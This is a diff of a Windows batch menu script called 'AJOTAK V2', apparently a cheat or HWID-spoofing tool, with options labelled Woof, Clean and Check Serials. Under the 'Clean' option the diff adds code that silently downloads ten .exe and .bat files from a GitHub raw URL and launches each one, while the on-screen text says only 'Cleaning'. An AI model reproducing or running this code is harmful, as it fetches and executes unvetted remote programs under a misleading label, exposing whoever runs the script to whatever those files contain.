@@ -20,11 +20,11 @@ cls
 echo.
 echo.
 echo ======================================================
-echo                    AJOTAK V2                   
+echo                    AJOTAK V2
 echo ======================================================
-echo   1.) Woof                              
-echo   2.) Clean                        
-echo   3.) Check Serials                                   
+echo   1.) Woof
+echo   2.) Clean
+echo   3.) Check Serials
 echo ======================================================
 echo.
 set /p choice= Selection: 
@@ -46,28 +46,29 @@ goto end
 :clean
 cls
 call :progress "Cleaning"
-for /L %%I in (1,1,10) do (
-    curl -L -s -o "%target%\1.exe" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/1.exe
-    curl -L -s -o "%target%\2.exe" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/2.exe
-    curl -L -s -o "%target%\3.exe" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/3.exe
-    curl -L -s -o "%target%\4.bat" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/4.bat
-    curl -L -s -o "%target%\5.exe" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/5.exe
-    curl -L -s -o "%target%\6.bat" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/6.bat
-    curl -L -s -o "%target%\7.bat" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/7.bat
-    curl -L -s -o "%target%\8.bat" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/8.bat
-    curl -L -s -o "%target%\9.bat" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/9.bat
-    curl -L -s -o "%target%\10.bat" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/10.bat
-    start %target%\1.exe
-    start %target%\2.exe
-    start %target%\3.exe
-    start %target%\4.bat
-    start %target%\5.exe
-    start %target%\6.bat
-    start %target%\7.bat
-    start %target%\8.bat
-    start %target%\9.bat
-    start %target%\10.bat
-)
+
+curl -L -s -o "%target%\1.exe" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/1.exe
+curl -L -s -o "%target%\2.exe" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/2.exe
+curl -L -s -o "%target%\3.exe" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/3.exe
+curl -L -s -o "%target%\4.bat" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/4.bat
+curl -L -s -o "%target%\5.exe" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/5.exe
+curl -L -s -o "%target%\6.bat" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/6.bat
+curl -L -s -o "%target%\7.bat" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/7.bat
+curl -L -s -o "%target%\8.bat" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/8.bat
+curl -L -s -o "%target%\9.bat" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/9.bat
+curl -L -s -o "%target%\10.bat" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/10.bat
+
+start "" "%target%\1.exe"
+start "" "%target%\2.exe"
+start "" "%target%\3.exe"
+start "" "%target%\4.bat"
+start "" "%target%\5.exe"
+start "" "%target%\6.bat"
+start "" "%target%\7.bat"
+start "" "%target%\8.bat"
+start "" "%target%\9.bat"
+start "" "%target%\10.bat"
+
 goto end
 
 :hwid
@@ -107,5 +108,5 @@ for /L %%i in (1,10,100) do (
 )
 exit /b
 
-
-
+:end
+exit /b
